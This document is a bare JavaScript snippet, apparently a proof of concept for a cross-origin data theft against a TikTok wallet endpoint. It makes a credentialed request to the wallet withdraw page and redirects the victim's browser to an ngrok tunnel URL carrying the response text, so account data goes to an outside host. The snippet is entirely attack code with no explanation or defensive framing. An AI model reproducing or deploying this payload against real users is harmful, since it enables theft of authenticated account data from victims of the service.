var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://fp.us.tiktokv.com/tt-web/wallet/withdraw/home");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='https://2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
